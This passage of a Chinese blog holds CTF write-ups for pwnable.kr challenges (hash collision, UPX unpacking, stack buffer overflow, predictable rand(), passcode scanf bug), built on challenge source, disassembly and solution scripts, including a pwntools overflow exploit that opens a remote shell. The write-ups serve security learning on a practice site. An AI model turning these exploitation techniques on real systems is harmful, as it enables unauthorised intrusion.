    <url>/2021/08/12/pwnable/pwnable.kr%E7%B3%BB%E5%88%9702-collision/</url>
    <content><![CDATA[<p> 第二题，是一道关于MD5 hash碰撞的 题目，使用ssh链接，题目详情如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806170420.png"></p>
<p>​    先链接上看看，密码guest：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806171452.png"></p>
<p>​    还是熟悉的几个文件，col.c是包含漏洞的源码、col为编译后的文件、flag是我们要读取的文件。当前用户col对于flag依旧没有读写权限，要读取flag内容，观察col_pwn就可以发现原理和fd依旧相同，这里直接分析col.c既可，其源代码内容如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ol>
<li>得到flag的前提是argv[1]经过运算后，能够和hashcode对应的值0x21DD09EC相匹配</li>
<li>argv[1]作为参数1，大小为20字节</li>
<li>check_password进行hash运算，函数将20字节的argv[1]拆分位一个int[5]数组进行累加运算</li>
</ol>
<p>综上，这里只需要找到一组int[5]来满足累加运算后值为0x21DD09EC即可成功破解。</p>
<p>​    这里可以考虑写程序暴力枚举破解，但对于这个简单的算法其实没必要，只需要保证五个四字节大小的数相加为hashcode即可，那么可以让前4个四字节数都为同一个值也就是参数的前16个字节都相同，比如设为0x0(这里不能为0x00，应为0x00会截断参数输入，其它任何数都可以)，那么最后一个四字节数就可以通过0x21DD09EC-0x05050505*4算出来为0x0DC8F5D8。</p>
<p>​    输入参数需要手动键入的话，很多非字母、数字和符号的ASCII字符是打不出来的，这就需要掌握点技巧，一个方法就是使用python这样的脚本对字符进行输出然后直接作为参数进行漏洞程序执行。使用python构建参数为如下形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`python2 -c <span class="string">&quot;print &#x27;\x05\x05\x05\x05&#x27;*0x4+&#x27;\xd8\xf5\xc8\x0d&#x27;&quot;</span>`</span><br></pre></td></tr></table></figure>

<p>​    然后我们进行验证，python2成功flag，这里不建议使用python3：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810145648.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之04-flag</title>
    <url>/2021/08/14/pwnable/pwnable.kr%E7%B3%BB%E5%88%9704-flag/</url>
    <content><![CDATA[<p>这道题看描述是一道CTF  reverse题，主要是考验动静结合的逆向能力，不同于pwn：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810161746.png"></p>
<p>​    wget下载下来，顺便查看flag文件类型，为64位elf文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810162520.png"></p>
<p>​    运行后提示：I will malloc() and strcpy the flag there. take it.</p>
<p>​    先静态分析一下，程序被加了upx壳，</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810191238.png"></p>
<p>​    将其脱壳再拖入IDA分析，代码很简单一目了然，跟进flag即可拿到对应的flag为：<strong>UPX…? sounds like a delivery service</strong> </p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810192307.png"></p>
<p>​    这里也可以gdb动态调试一下脱壳后的样本，在strcpy处(0x401195)设置断点，然后查看esi中对应字符串内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810194608.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810194826.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之03-bof</title>
    <url>/2021/08/13/pwnable/pwnable.kr%E7%B3%BB%E5%88%9703-bof/</url>
    <content><![CDATA[<p>  通过该题的下载链接下载到源码和编译后的程序，提示如下： </p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability.</span><br><span class="line">Is that true?</span><br><span class="line"> </span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"> </span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>

<p>​    题目代码如下 bof.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">    gets(overflowme);    <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    是一个很简单的栈溢出漏洞，把key的值替换为0xcagebabe即可成功flag，但是第一次使用gdb+pwotools来做题时，还是对一些分析流程以及偏移的计算不太熟练，尝试了很多次。</p>
<p>​    拿到程序先用checksec来查看一下启用的保护，因为是练手程序，所以基本上所有保护都被关闭了，只开启了RELRO(只读保护)，对栈利用无影响:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn20210729180341.png"></p>
<p>接下来就是调试算偏移，file加载bof到gdb，break func对存在溢出点的函数下断，run执行，成功断到func入口处，有两种算偏移的方法，如果熟悉汇编代码可以直接通过disassemble对func函数反编译，通过代码计算栈偏移即可，反编译后代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">&#x3D;&gt; 0x080491f6 &lt;+0&gt;:    endbr32</span><br><span class="line">   0x080491fa &lt;+4&gt;:    push   ebp</span><br><span class="line">   0x080491fb &lt;+5&gt;:    mov    ebp,esp</span><br><span class="line">   0x080491fd &lt;+7&gt;:    push   ebx</span><br><span class="line">   0x080491fe &lt;+8&gt;:    sub    esp,0x24</span><br><span class="line">   0x08049201 &lt;+11&gt;:    call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x08049206 &lt;+16&gt;:    add    ebx,0x2dfa</span><br><span class="line">   0x0804920c &lt;+22&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804920f &lt;+25&gt;:    lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x08049215 &lt;+31&gt;:    push   eax</span><br><span class="line">   0x08049216 &lt;+32&gt;:    call   0x8049090 &lt;printf@plt&gt;</span><br><span class="line">   0x0804921b &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x0804921e &lt;+40&gt;:    sub    esp,0xc</span><br><span class="line">   0x08049221 &lt;+43&gt;:    lea    eax,[ebp-0x28]</span><br><span class="line">   0x08049224 &lt;+46&gt;:    push   eax</span><br><span class="line">   0x08049225 &lt;+47&gt;:    call   0x80490a0 &lt;gets@plt&gt;</span><br><span class="line">   0x0804922a &lt;+52&gt;:    add    esp,0x10</span><br><span class="line">   0x0804922d &lt;+55&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br><span class="line">   0x08049234 &lt;+62&gt;:    jne    0x804924a &lt;func+84&gt;</span><br><span class="line">   0x08049236 &lt;+64&gt;:    sub    esp,0xc</span><br><span class="line">   0x08049239 &lt;+67&gt;:    lea    eax,[ebx-0x1fe9]</span><br><span class="line">   0x0804923f &lt;+73&gt;:    push   eax</span><br><span class="line">   0x08049240 &lt;+74&gt;:    call   0x80490c0 &lt;system@plt&gt;</span><br><span class="line">   0x08049245 &lt;+79&gt;:    add    esp,0x10</span><br><span class="line">   0x08049248 &lt;+82&gt;:    jmp    0x804925c &lt;func+102&gt;</span><br><span class="line">   0x0804924a &lt;+84&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804924d &lt;+87&gt;:    lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x08049253 &lt;+93&gt;:    push   eax</span><br><span class="line">   0x08049254 &lt;+94&gt;:    call   0x80490b0 &lt;puts@plt&gt;</span><br><span class="line">   0x08049259 &lt;+99&gt;:    add    esp,0x10</span><br><span class="line">   0x0804925c &lt;+102&gt;:    nop</span><br><span class="line">   0x0804925d &lt;+103&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049260 &lt;+106&gt;:    leave</span><br><span class="line">   0x08049261 &lt;+107&gt;:    ret  </span><br><span class="line">End of assembler dump.</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>​    可以看出来，要覆盖的key在ebp+0x8处，gets获取的字符串存储位置从ebp-0x28处开始，也就是偏移为0x30</p>
<p>​    也可以通过对gets前下断，c运行到断点处，n继续运行键入AAAA作为标记然后查看内存来算出偏移。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn20210730104415.png"></p>
<p><strong>使用pwntool进行远程漏洞利用</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">    c.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;A&quot;</span>,<span class="string">&#x27;latin-1&#x27;</span>)*<span class="number">0x30</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">    c.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之06-random</title>
    <url>/2021/08/16/pwnable/pwnable.kr%E7%B3%BB%E5%88%9706-random/</url>
    <content><![CDATA[<p>从描述信息来看，本道题是关于随机数的题目，提示信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812103001.png"></p>
<p>​    ssh登上查看文件及权限：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812105346.png"></p>
<p>​    查看random.c源代码并反汇编后分析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004005f4 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00000000004005f5 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x00000000004005f8 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x00000000004005fc &lt;+8&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400601 &lt;+13&gt;:	call   0x400500 &lt;rand@plt&gt;</span><br><span class="line">   0x0000000000400606 &lt;+18&gt;:	mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">   0x0000000000400609 &lt;+21&gt;:	mov    DWORD PTR [rbp-0x8],0x0</span><br><span class="line">   0x0000000000400610 &lt;+28&gt;:	mov    eax,0x400760</span><br><span class="line">   0x0000000000400615 &lt;+33&gt;:	lea    rdx,[rbp-0x8]</span><br><span class="line">   0x0000000000400619 &lt;+37&gt;:	mov    rsi,rdx</span><br><span class="line">   0x000000000040061c &lt;+40&gt;:	mov    rdi,rax</span><br><span class="line">   0x000000000040061f &lt;+43&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400624 &lt;+48&gt;:	call   0x4004f0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000400629 &lt;+53&gt;:	mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">&#x3D;&gt; 0x000000000040062c &lt;+56&gt;:	xor    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x000000000040062f &lt;+59&gt;:	cmp    eax,0xdeadbeef</span><br><span class="line">   0x0000000000400634 &lt;+64&gt;:	jne    0x400656 &lt;main+98&gt;</span><br><span class="line">   0x0000000000400636 &lt;+66&gt;:	mov    edi,0x400763</span><br><span class="line">   0x000000000040063b &lt;+71&gt;:	call   0x4004c0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400640 &lt;+76&gt;:	mov    edi,0x400769</span><br><span class="line">   0x0000000000400645 &lt;+81&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000040064a &lt;+86&gt;:	call   0x4004d0 &lt;system@plt&gt;</span><br><span class="line">   0x000000000040064f &lt;+91&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400654 &lt;+96&gt;:	jmp    0x400665 &lt;main+113&gt;</span><br><span class="line">   0x0000000000400656 &lt;+98&gt;:	mov    edi,0x400778</span><br><span class="line">   0x000000000040065b &lt;+103&gt;:	call   0x4004c0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400660 &lt;+108&gt;:	mov    eax,0x0</span><br><span class="line">   0x0000000000400665 &lt;+113&gt;:	leave  </span><br><span class="line">   0x0000000000400666 &lt;+114&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<pre><code> 1.  cat flag条件是随机数random和key异或后未0xdeadbeef。
 2.  key通过scanf()接收的，random为随机生成的四字节数，最开始想到是否可以给key赋值8个字节来覆盖random，但注意到scanf(&quot;%d&quot;,&amp;key)这里使用了%d坐限制，使得key只能被赋值为一个DWORD(四字节)，所以这个方案pass。
 3.  继续分析发现，该题目并不是一个严格意义上的漏洞题，重点在于随机数random的生成。写过C代码就知道，rand()是伪随机的，正常使用情况下需要在rand()之前生成一个随机数种子(一般使用但钱时间作为随机数种子)作为rand()的参数来保证准确生成随机数。而这里直接使用rand()，随机数种子就是系统默认的1，会导致每次生成的random都是一个数。</code></pre>
<p>​       所以cat flag就简单了，调试一下random程序，得到变量random的值，然后逆运算即可得到key的值，random值存储在rbp-0x4处，本地调试和ssh远程调试得到的值都为：0x6b8b4567</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812155238.png"></p>
<p>​    key=0xdeadbeef ^ 0x6b8b4567 =3039230856</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812155605.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之05-passcode</title>
    <url>/2021/08/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/</url>
    <content><![CDATA[<p>这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811101230.png"></p>
<p>​    还是通过ssh链接查看题目内容，ssh <a href="mailto:&#x70;&#x61;&#x73;&#115;&#99;&#111;&#100;&#101;&#x40;&#x70;&#119;&#x6e;&#x61;&#98;&#x6c;&#x65;&#x2e;&#x6b;&#114;">&#x70;&#x61;&#x73;&#115;&#99;&#111;&#100;&#101;&#x40;&#x70;&#119;&#x6e;&#x61;&#98;&#x6c;&#x65;&#x2e;&#x6b;&#114;</a> -p2222 (pw:guest)，题目里的东西还是老几样，重点关注文件权限：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811104304.png"></p>
<p>​    然后查看passcode.c源码，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ol>
<li>从能成功flag处逆着看，首先要满足两个条件passcode1和psscode2的值为两个给定的值338150(0x528e6)和13371337(0xcc07c9)</li>
<li>passcode1和passcode2通过scanf()输入，但是这里程序写错，未使用&amp;来取变量地址，所以会把这两个变量的值直接作为地址来存储输入的内容，两个变量初始化时未赋值，所以值是随机的</li>
<li>要想利用，那么就要想办法覆盖passcode1和passcode2的值，来控制scanf()对任意地址写入数据。</li>
</ol>
<p><strong>解法思路：</strong></p>
<ol>
<li><p>welcome()和login()是两个连续调用的函数，所以对于栈空间的利用是会有部分重叠的，name限定了100字节的大小，可以考虑是否可以在这100个字节内修改道passcode1和passcode2的初始值，使其变得不随机。</p>
<p>这里先把passcode通过pwntools下载到本地进行调试(passcode.c和passcode有读取权限，而flag没有，所以想直接下载flag到本地是不可以的)，利用到的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	shell.download_file(<span class="string">&#x27;passcode&#x27;</span>)</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>   下载后进行调试，已经分析过了，所以这里直接查看welcode和login反编译，查看到name和passcode1、passcode2的位置来计算偏移即可：</p>
<p>   welcode():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804860c &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">   0x08048612 &lt;+9&gt;:	mov    eax,gs:0x14</span><br><span class="line">   0x08048618 &lt;+15&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804861b &lt;+18&gt;:	xor    eax,eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:	mov    eax,0x80487cb</span><br><span class="line">   0x08048622 &lt;+25&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048625 &lt;+28&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:	mov    eax,0x80487dd</span><br><span class="line">   0x0804862f &lt;+38&gt;:	lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048632 &lt;+41&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048636 &lt;+45&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048639 &lt;+48&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:	mov    eax,0x80487e3</span><br><span class="line">   0x08048643 &lt;+58&gt;:	lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048646 &lt;+61&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x0804864a &lt;+65&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804864d &lt;+68&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048652 &lt;+73&gt;:	mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08048655 &lt;+76&gt;:	xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x0804865c &lt;+83&gt;:	je     0x8048663 &lt;welcome+90&gt;</span><br><span class="line">   0x0804865e &lt;+85&gt;:	call   0x8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x08048663 &lt;+90&gt;:	leave  </span><br><span class="line">   0x08048664 &lt;+91&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>​    login()：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048567 &lt;+3&gt;:	sub    esp,0x28</span><br><span class="line">   0x0804856a &lt;+6&gt;:	mov    eax,0x8048770</span><br><span class="line">   0x0804856f &lt;+11&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048572 &lt;+14&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:	mov    eax,0x8048783</span><br><span class="line">   0x0804857c &lt;+24&gt;:	mov    edx,DWORD PTR [ebp-0x10]</span><br><span class="line">   0x0804857f &lt;+27&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048583 &lt;+31&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048586 &lt;+34&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:	mov    eax,ds:0x804a02c</span><br><span class="line">   0x08048590 &lt;+44&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048593 &lt;+47&gt;:	call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:	mov    eax,0x8048786</span><br><span class="line">   0x0804859d &lt;+57&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485a0 &lt;+60&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:	mov    eax,0x8048783</span><br><span class="line">   0x080485aa &lt;+70&gt;:	mov    edx,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080485ad &lt;+73&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080485b1 &lt;+77&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485b4 &lt;+80&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080485b9 &lt;+85&gt;:	mov    DWORD PTR [esp],0x8048799</span><br><span class="line">   0x080485c0 &lt;+92&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485c5 &lt;+97&gt;:	cmp    DWORD PTR [ebp-0x10],0x528e6</span><br><span class="line">   0x080485cc &lt;+104&gt;:	jne    0x80485f1 